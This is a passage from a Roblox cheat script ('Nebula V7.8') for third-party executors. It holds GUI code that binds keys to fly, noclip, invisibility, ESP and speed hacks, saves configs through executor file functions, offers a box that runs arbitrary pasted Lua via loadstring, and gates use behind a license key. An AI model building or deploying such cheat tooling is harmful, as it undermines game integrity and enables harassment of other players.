    MenuKeyBtn.TextColor3 = Color3.fromRGB(170, 170, 182)
    MenuKeyBtn.Font = Enum.Font.GothamMedium
    MenuKeyBtn.TextSize = 11
    MenuKeyBtn.Parent = MenuKeybindFrame

    local MenuKeyCorner = Instance.new("UICorner")
    MenuKeyCorner.CornerRadius = UDim.new(0, 5)
    MenuKeyCorner.Parent = MenuKeyBtn

    KeybindButtons["Menu"] = MenuKeyBtn
    MenuKeyBtn.MouseButton1Click:Connect(function()
        KeybindSystem.Binding = true
        KeybindSystem.BindingName = "Menu"
        KeybindSystem.BindingBtn = MenuKeyBtn
        MenuKeyBtn.Text = "Press..."
    end)

    createLabel("KEYBINDS", SettingsContent)
    local function createKeybindButton(name, defaultKey, callback)
        local KeybindFrame = Instance.new("Frame")
        KeybindFrame.Size = UDim2.new(1, 0, 0, 40)
        KeybindFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
        KeybindFrame.BorderSizePixel = 0
        KeybindFrame.Parent = SettingsContent

        local KeybindCorner = Instance.new("UICorner")
        KeybindCorner.CornerRadius = UDim.new(0, 8)
        KeybindCorner.Parent = KeybindFrame

        local Label = Instance.new("TextLabel")
        Label.Size = UDim2.new(0.6, 0, 1, 0)
        Label.Position = UDim2.new(0, 14, 0, 0)
        Label.BackgroundTransparency = 1
        Label.Text = name
        Label.TextColor3 = Color3.fromRGB(195, 195, 208)
        Label.Font = Enum.Font.GothamMedium
        Label.TextSize = 13
        Label.TextXAlignment = Enum.TextXAlignment.Left
        Label.Parent = KeybindFrame

        local KeyBtn = Instance.new("TextButton")
        KeyBtn.Size = UDim2.new(0, 80, 0, 26)
        KeyBtn.Position = UDim2.new(1, -94, 0.5, -13)
        KeyBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
        KeyBtn.BorderSizePixel = 0
        KeyBtn.Text = Keybinds[name] and Keybinds[name].Name or defaultKey.Name
        KeyBtn.TextColor3 = Color3.fromRGB(170, 170, 182)
        KeyBtn.Font = Enum.Font.GothamMedium
        KeyBtn.TextSize = 11
        KeyBtn.Parent = KeybindFrame

        local KeyCorner = Instance.new("UICorner")
        KeyCorner.CornerRadius = UDim.new(0, 5)
        KeyCorner.Parent = KeyBtn

        KeybindCallbacks[name] = callback
        KeybindButtons[name] = KeyBtn

        KeyBtn.MouseButton1Click:Connect(function()
            KeybindSystem.Binding = true
            KeybindSystem.BindingName = name
            KeybindSystem.BindingBtn = KeyBtn
            KeyBtn.Text = "Press..."
        end)
    end

    createKeybindButton("Fly", Keybinds.Fly, ToggleFly)
    createKeybindButton("Noclip", Keybinds.Noclip, ToggleNoclip)
    createKeybindButton("Invisible", Keybinds.Invisible, ToggleInvis)
    createKeybindButton("DesyncFly", Keybinds.DesyncFly, ToggleDesync)
    createKeybindButton("ESP", Keybinds.ESP, ToggleESP)
    createKeybindButton("Speed", Keybinds.Speed, ToggleSpeed)
    createKeybindButton("Respawn", Keybinds.Respawn, respawnPlayer)
end

createLabel("UNLOAD", SettingsContent)
local function unloadNebula()
    pcall(function()
        if V.Fly then stopFly() end
        if V.DesyncFly then stopDesyncFly() end
        if V.Noclip then stopNoclip() end
        if V.Invis then toggleInvisibility(false) end
        if V.NoAnim then disableNoAnim() end
        if V.Attached then
            V.Attached = nil
            if V.AttachConn then V.AttachConn:Disconnect() V.AttachConn = nil end
        end
        if V.Flinging then stopFling() end
        if V.InfRange then toggleInfiniteRange(false) end
        if V.FPSBoost then toggleFPSBooster(false) end
        if V.Fullbright then toggleFullbright(false) end
        if V.ESP then V.ESP = false clearESP() end
        if V.ClickTP then toggleClickTP(false) end
        if V.Spin then
            if V.SpinConn then V.SpinConn:Disconnect() V.SpinConn = nil end
            pcall(function()
                local char = LocalPlayer.Character
                local humanoid = char and char:FindFirstChildOfClass("Humanoid")
                if humanoid then humanoid.AutoRotate = true end
            end)
        end

        for _, conn in pairs(C.All) do
            pcall(function() conn:Disconnect() end)
        end
        C.All = {}

        pcall(function()
            local char = LocalPlayer.Character
            if char then
                local humanoid = char:FindFirstChildOfClass("Humanoid")
                if humanoid then
                    humanoid.PlatformStand = false
                    humanoid.AutoRotate = true
                    humanoid.Sit = false
                    humanoid:ChangeState(Enum.HumanoidStateType.GettingUp)
                    humanoid.WalkSpeed = 16
                    humanoid.JumpPower = 50
                end
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    hrp.Anchored = false
                    hrp.AssemblyLinearVelocity = Vector3.new(0,0,0)
                    hrp.AssemblyAngularVelocity = Vector3.new(0,0,0)
                    for _, obj in pairs(hrp:GetChildren()) do
                        if obj:IsA("BodyGyro") or obj:IsA("BodyVelocity") then obj:Destroy() end
                    end
                end
            end
        end)

        workspace.Gravity = 196
        Camera.FieldOfView = 70
        Camera.CameraType = Enum.CameraType.Custom
        Lighting.GlobalShadows = true
        Lighting.Brightness = 1
        Lighting.Ambient = Color3.fromRGB(0,0,0)
        LocalPlayer.CameraMode = Enum.CameraMode.Classic
        LocalPlayer.CameraMaxZoomDistance = 128
        ScreenGui:Destroy()
        ESPGui:Destroy()
    end)
end

do
    local UnloadBtnContainer = Instance.new("TextButton")
    UnloadBtnContainer.Size = UDim2.new(1, 0, 0, 46)
    UnloadBtnContainer.BackgroundColor3 = Color3.fromRGB(35, 15, 15)
    UnloadBtnContainer.BorderSizePixel = 0
    UnloadBtnContainer.Text = "UNLOAD NEBULA"
    UnloadBtnContainer.TextColor3 = Color3.fromRGB(255, 90, 90)
    UnloadBtnContainer.Font = Enum.Font.GothamBold
    UnloadBtnContainer.TextSize = 14
    UnloadBtnContainer.Parent = SettingsContent

    local UnloadCorner = Instance.new("UICorner")
    UnloadCorner.CornerRadius = UDim.new(0, 8)
    UnloadCorner.Parent = UnloadBtnContainer

    UnloadBtnContainer.MouseButton1Click:Connect(unloadNebula)
end

createLabel("CONFIGURATION", ConfigContent)
do
    local ConfigNameBox = Instance.new("TextBox")
    ConfigNameBox.Size = UDim2.new(1, 0, 0, 34)
    ConfigNameBox.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
    ConfigNameBox.BorderSizePixel = 0
    ConfigNameBox.PlaceholderText = "Nom de la config (ex: Main)"
    ConfigNameBox.PlaceholderColor3 = Color3.fromRGB(90, 90, 100)
    ConfigNameBox.Text = "Default"
    ConfigNameBox.TextColor3 = Color3.fromRGB(210, 210, 222)
    ConfigNameBox.Font = Enum.Font.GothamMedium
    ConfigNameBox.TextSize = 12
    ConfigNameBox.TextXAlignment = Enum.TextXAlignment.Left
    ConfigNameBox.Parent = ConfigContent

    local ConfigNamePadding = Instance.new("UIPadding")
    ConfigNamePadding.PaddingLeft = UDim.new(0, 10)
    ConfigNamePadding.Parent = ConfigNameBox

    local ConfigNameCorner = Instance.new("UICorner")
    ConfigNameCorner.CornerRadius = UDim.new(0, 6)
    ConfigNameCorner.Parent = ConfigNameBox

    local ConfigListFrame = Instance.new("Frame")
    ConfigListFrame.Size = UDim2.new(1, 0, 1, -50)
    ConfigListFrame.Position = UDim2.new(0, 0, 0, 40)
    ConfigListFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    ConfigListFrame.BorderSizePixel = 0
    ConfigListFrame.Parent = ConfigContent

    local ConfigListFrameCorner = Instance.new("UICorner")
    ConfigListFrameCorner.CornerRadius = UDim.new(0, 8)
    ConfigListFrameCorner.Parent = ConfigListFrame

    local ConfigList = Instance.new("ScrollingFrame")
    ConfigList.Size = UDim2.new(1, 0, 1, 0)
    ConfigList.BackgroundTransparency = 1
    ConfigList.CanvasSize = UDim2.new(0, 0, 0, 0)
    ConfigList.AutomaticCanvasSize = Enum.AutomaticSize.Y
    ConfigList.ScrollBarThickness = 2
    ConfigList.Parent = ConfigListFrame

    local ConfigListLayout = Instance.new("UIListLayout")
    ConfigListLayout.Padding = UDim.new(0, 5)
    ConfigListLayout.Parent = ConfigList

    local ConfigListPadding = Instance.new("UIPadding")
    ConfigListPadding.PaddingTop = UDim.new(0, 5)
    ConfigListPadding.PaddingLeft = UDim.new(0, 5)
    ConfigListPadding.PaddingRight = UDim.new(0, 5)
    ConfigListPadding.Parent = ConfigList

    local function refreshConfigList()
        for _, child in pairs(ConfigList:GetChildren()) do
            if child:IsA("Frame") or child:IsA("TextLabel") then child:Destroy() end
        end

        if not listfiles then
            local lbl = Instance.new("TextLabel")
            lbl.Size = UDim2.new(1, 0, 0, 30)
            lbl.BackgroundTransparency = 1
            lbl.Text = "listfiles not supported"
            lbl.TextColor3 = Color3.fromRGB(255, 90, 90)
            lbl.Font = Enum.Font.GothamMedium
            lbl.TextSize = 12
            lbl.Parent = ConfigList
            return
        end

        local files = listfiles()
        if not files then return end

        local hasConfigs = false

        for _, filePath in ipairs(files) do
            local fileName = string.match(filePath, "([^/\\]+)$") or filePath
            local cfgName = string.match(fileName, "NebulaConfig_(.-)%.json")
            if cfgName then
                hasConfigs = true
                local CfgFrame = Instance.new("Frame")
                CfgFrame.Size = UDim2.new(1, 0, 0, 38)
                CfgFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
                CfgFrame.BorderSizePixel = 0
                CfgFrame.Parent = ConfigList

                local CfgCorner = Instance.new("UICorner")
                CfgCorner.CornerRadius = UDim.new(0, 8)
                CfgCorner.Parent = CfgFrame

                local CfgLabel = Instance.new("TextLabel")
                CfgLabel.Size = UDim2.new(0.4, 0, 1, 0)
                CfgLabel.Position = UDim2.new(0, 10, 0, 0)
                CfgLabel.BackgroundTransparency = 1
                CfgLabel.Text = cfgName
                CfgLabel.TextColor3 = Color3.fromRGB(195, 195, 208)
                CfgLabel.Font = Enum.Font.GothamMedium
                CfgLabel.TextSize = 12
                CfgLabel.TextXAlignment = Enum.TextXAlignment.Left
                CfgLabel.Parent = CfgFrame

                local LoadBtn = Instance.new("TextButton")
                LoadBtn.Size = UDim2.new(0, 60,0, 26)
                LoadBtn.Position = UDim2.new(1, -130, 0.5, -13)
                LoadBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
                LoadBtn.BorderSizePixel = 0
                LoadBtn.Text = "Load"
                LoadBtn.TextColor3 = Color3.fromRGB(195, 195, 208)
                LoadBtn.Font = Enum.Font.GothamMedium
                LoadBtn.TextSize = 11
                LoadBtn.Parent = CfgFrame

                local LoadCorner = Instance.new("UICorner")
                LoadCorner.CornerRadius = UDim.new(0, 5)
                LoadCorner.Parent = LoadBtn

                LoadBtn.MouseEnter:Connect(function()
                    TweenService:Create(LoadBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(45, 45, 50)}):Play()
                end)
                LoadBtn.MouseLeave:Connect(function()
                    TweenService:Create(LoadBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(26, 26, 32)}):Play()
                end)

                LoadBtn.MouseButton1Click:Connect(function()
                    if readfile then
                        local content = readfile(filePath)
                        if content then
                            pcall(function()
                                local cfg = HttpService:JSONDecode(content)
                                
                                for key, val in pairs(DefaultConfig) do
                                    if ConfigRegistry[key] then
                                        ConfigRegistry[key](val)
                                    end
                                end
                                
                                for key, setter in pairs(ConfigRegistry) do
                                    if cfg[key] ~= nil then
                                        setter(cfg[key])
                                    end
                                end
                                
                                if cfg.Keybinds then
                                    Keybinds.Fly = Enum.KeyCode[cfg.Keybinds.Fly] or Keybinds.Fly
                                    Keybinds.Noclip = Enum.KeyCode[cfg.Keybinds.Noclip] or Keybinds.Noclip
                                    Keybinds.Invisible = Enum.KeyCode[cfg.Keybinds.Invisible] or Keybinds.Invisible
                                    Keybinds.DesyncFly = Enum.KeyCode[cfg.Keybinds.DesyncFly] or Keybinds.DesyncFly
                                    if cfg.Keybinds.ESP then Keybinds.ESP = Enum.KeyCode[cfg.Keybinds.ESP] end
                                    if cfg.Keybinds.Speed then Keybinds.Speed = Enum.KeyCode[cfg.Keybinds.Speed] end
                                    if cfg.Keybinds.Respawn then Keybinds.Respawn = Enum.KeyCode[cfg.Keybinds.Respawn] end
                                    if cfg.Keybinds.Menu then Keybinds.Menu = Enum.KeyCode[cfg.Keybinds.Menu] end
                                    
                                    for name, btn in pairs(KeybindButtons) do
                                        if Keybinds[name] then btn.Text = Keybinds[name].Name end
                                    end
                                end
                                
                                notify("Config", cfgName .. " chargée avec succès !", Color3.fromRGB(80, 200, 120))
                            end)
                        end
                    end
                end)

                local DelBtn = Instance.new("TextButton")
                DelBtn.Size = UDim2.new(0, 60, 0, 26)
                DelBtn.Position = UDim2.new(1, -65, 0.5, -13)
                DelBtn.BackgroundColor3 = Color3.fromRGB(40, 22, 22)
                DelBtn.BorderSizePixel = 0
                DelBtn.Text = "Delete"
                DelBtn.TextColor3 = Color3.fromRGB(170, 110, 110)
                DelBtn.Font = Enum.Font.GothamMedium
                DelBtn.TextSize = 10
                DelBtn.Parent = CfgFrame

                local DelCorner = Instance.new("UICorner")
                DelCorner.CornerRadius = UDim.new(0, 5)
                DelCorner.Parent = DelBtn

                DelBtn.MouseEnter:Connect(function()
                    TweenService:Create(DelBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 30, 30)}):Play()
                end)
                DelBtn.MouseLeave:Connect(function()
                    TweenService:Create(DelBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 22, 22)}):Play()
                end)

                DelBtn.MouseButton1Click:Connect(function()
                    if delfile then
                        delfile(filePath)
                        notify("Config", cfgName .. " deleted!", Color3.fromRGB(255, 90, 90))
                        refreshConfigList()
                    end
                end)
            end
        end

        if not hasConfigs then
            local lbl = Instance.new("TextLabel")
            lbl.Size = UDim2.new(1, 0, 0, 30)
            lbl.BackgroundTransparency = 1
            lbl.Text = "No configs found"
            lbl.TextColor3 = Color3.fromRGB(120, 120, 132)
            lbl.Font = Enum.Font.GothamMedium
            lbl.TextSize = 12
            lbl.Parent = ConfigList
        end
    end

    local function saveConfig()
        local cfgName = ConfigNameBox.Text
        if cfgName == "" then cfgName = "Default" end
        local fileName = "NebulaConfig_" .. cfgName .. ".json"
        pcall(function()
            local cfg = {}
            for key, _ in pairs(ConfigRegistry) do
                cfg[key] = V[key]
            end
            cfg.Keybinds = {
                Fly = Keybinds.Fly.Name,
                Noclip = Keybinds.Noclip.Name,
                Invisible = Keybinds.Invisible.Name,
                DesyncFly = Keybinds.DesyncFly.Name,
                ESP = Keybinds.ESP.Name,
                Speed = Keybinds.Speed.Name,
                Respawn = Keybinds.Respawn.Name,
                Menu = Keybinds.Menu.Name
            }
            if writefile then
                writefile(fileName, HttpService:JSONEncode(cfg))
                notify("Config", "Saved ALL settings as " .. cfgName .. "!", Color3.fromRGB(80, 200, 120))
                refreshConfigList()
            else
                notify("Config", "Writefile not supported.", Color3.fromRGB(255, 90, 90))
            end
        end)
    end

    createButton("Save Config", saveConfig, ConfigContent)
    createButton("Refresh Configs", refreshConfigList, ConfigContent)

    refreshConfigList()
end

createLabel("EXECUTE CODE", CodeContent)
do
    local CodeBox = Instance.new("TextBox")
    CodeBox.Size = UDim2.new(1, 0, 1, -50)
    CodeBox.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
    CodeBox.BorderSizePixel = 0
    CodeBox.Text = ""
    CodeBox.PlaceholderText = "Colle ton code Lua ici"
    CodeBox.PlaceholderColor3 = Color3.fromRGB(90, 90, 100)
    CodeBox.TextColor3 = Color3.fromRGB(210, 210, 222)
    CodeBox.Font = Enum.Font.Code
    CodeBox.TextSize = 14
    CodeBox.TextWrapped = true
    CodeBox.MultiLine = true
    CodeBox.TextXAlignment = Enum.TextXAlignment.Left
    CodeBox.TextYAlignment = Enum.TextYAlignment.Top
    CodeBox.Parent = CodeContent

    local CodeBoxCorner = Instance.new("UICorner")
    CodeBoxCorner.CornerRadius = UDim.new(0, 8)
    CodeBoxCorner.Parent = CodeBox

    local CodeBoxPadding = Instance.new("UIPadding")
    CodeBoxPadding.PaddingLeft = UDim.new(0, 8)
    CodeBoxPadding.PaddingRight = UDim.new(0, 8)
    CodeBoxPadding.PaddingTop = UDim.new(0, 8)
    CodeBoxPadding.PaddingBottom = UDim.new(0, 8)
    CodeBoxPadding.Parent = CodeBox

    local ButtonContainer = Instance.new("Frame")
    ButtonContainer.Size = UDim2.new(1, 0, 0, 38)
    ButtonContainer.Position = UDim2.new(0, 0, 1, -40)
    ButtonContainer.BackgroundTransparency = 1
    ButtonContainer.Parent = CodeContent

    local ButtonLayout = Instance.new("UIListLayout")
    ButtonLayout.FillDirection = Enum.FillDirection.Horizontal
    ButtonLayout.Padding = UDim.new(0, 5)
    ButtonLayout.Parent = ButtonContainer

    local ExecBtn = Instance.new("TextButton")
    ExecBtn.Size = UDim2.new(0.5, -3, 1, 0)
    ExecBtn.BackgroundColor3 = Color3.fromRGB(26, 26, 32)
    ExecBtn.BorderSizePixel = 0
    ExecBtn.Text = "Execute"
    ExecBtn.TextColor3 = Color3.fromRGB(195, 195, 208)
    ExecBtn.Font = Enum.Font.GothamMedium
    ExecBtn.TextSize = 13
    ExecBtn.Parent = ButtonContainer

    local ExecCorner = Instance.new("UICorner")
    ExecCorner.CornerRadius = UDim.new(0, 8)
    ExecCorner.Parent = ExecBtn

    local ExecStroke = Instance.new("UIStroke")
    ExecStroke.Thickness = 0.8
    ExecStroke.Color = Color3.fromRGB(40, 40, 48)
    ExecStroke.Transparency = 0.5
    ExecStroke.Parent = ExecBtn

    local ClearBtn = Instance.new("TextButton")
    ClearBtn.Size = UDim2.new(0.5, -3, 1, 0)
    ClearBtn.BackgroundColor3 = Color3.fromRGB(40, 22, 22)
    ClearBtn.BorderSizePixel = 0
    ClearBtn.Text = "Clear"
    ClearBtn.TextColor3 = Color3.fromRGB(170, 110, 110)
    ClearBtn.Font = Enum.Font.GothamMedium
    ClearBtn.TextSize = 13
    ClearBtn.Parent = ButtonContainer

    local ClearCorner = Instance.new("UICorner")
    ClearCorner.CornerRadius = UDim.new(0, 8)
    ClearCorner.Parent = ClearBtn

    local ClearStroke = Instance.new("UIStroke")
    ClearStroke.Thickness = 0.8
    ClearStroke.Color = Color3.fromRGB(80, 40, 40)
    ClearStroke.Transparency = 0.5
    ClearStroke.Parent = ClearBtn

    ExecBtn.MouseEnter:Connect(function()
        TweenService:Create(ExecBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(45, 45, 50)}):Play()
    end)
    ExecBtn.MouseLeave:Connect(function()
        TweenService:Create(ExecBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(26, 26, 32)}):Play()
    end)

    ClearBtn.MouseEnter:Connect(function()
        TweenService:Create(ClearBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(60, 30, 30)}):Play()
    end)
    ClearBtn.MouseLeave:Connect(function()
        TweenService:Create(ClearBtn, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(40, 22, 22)}):Play()
    end)

    ExecBtn.MouseButton1Click:Connect(function()
        local codeToRun = CodeBox.Text
        if codeToRun == "" or codeToRun:match("^%s*$") then
            notify("Code", "No code to execute!", Color3.fromRGB(255, 165, 0))
            return
        end
        
        local func, err = loadstring(codeToRun)
        if func then
            local success, runtimeErr = pcall(func)
            if success then
                notify("Code", "Code executed successfully!", Color3.fromRGB(80, 200, 120))
            else
                notify("Code", "Runtime Error: " .. tostring(runtimeErr), Color3.fromRGB(255, 90, 90))
            end
        else
            notify("Code", "Syntax Error: " .. tostring(err), Color3.fromRGB(255, 90, 90))
        end
    end)

    ClearBtn.MouseButton1Click:Connect(function()
        CodeBox.Text = ""
        notify("Code", "Cleared text box.", Color3.fromRGB(180, 180, 195))
    end)
end

V.UnifiedInputConn = UserInputService.InputBegan:Connect(function(input, gameProcessed)
    if input.UserInputType == Enum.UserInputType.Keyboard then
        if KeybindSystem.Binding then
            local newKey = input.KeyCode
            local alreadyUsed = false
            for kName, kVal in pairs(Keybinds) do
                if kName ~= KeybindSystem.BindingName and kVal == newKey then
                    alreadyUsed = true
                    break
                end
            end

            if alreadyUsed then
                notify("Settings", "Key already used by another bind!", Color3.fromRGB(255, 90, 90))
            else
                Keybinds[KeybindSystem.BindingName] = newKey
                if KeybindSystem.BindingBtn then
                    KeybindSystem.BindingBtn.Text = newKey.Name
                end
                notify("Settings", KeybindSystem.BindingName .. " set to " .. newKey.Name, Color3.fromRGB(80, 200, 120))
            end
            KeybindSystem.Binding = false
            KeybindSystem.BindingName = nil
            KeybindSystem.BindingBtn = nil
            return
        end

        if not gameProcessed then
            if input.KeyCode == Keybinds.Menu then
                MainFrame.Visible = not MainFrame.Visible
                return
            end

            for name, key in pairs(Keybinds) do
                if name ~= "Menu" and input.KeyCode == key and KeybindCallbacks[name] then
                    KeybindCallbacks[name]()
                    return
                end
            end
        end
    end
end)
addConnection(V.UnifiedInputConn)

MainFrame.Visible = true
notify("Nebula V7.8", "Script loaded successfully!", Color3.fromRGB(80, 200, 120))
    else
        ErrorLabel.Text = "Clé invalide. Réessayez."
        ErrorLabel.TextColor3 = Color3.fromRGB(255, 80, 80)
        ShakeFrame()
        KeyInput.Text = ""
    end
end

SubmitButton.MouseButton1Click:Connect(CheckKey)

KeyInput.FocusLost:Connect(function(enterPressed)
    if enterPressed then
        CheckKey()
    end
end)
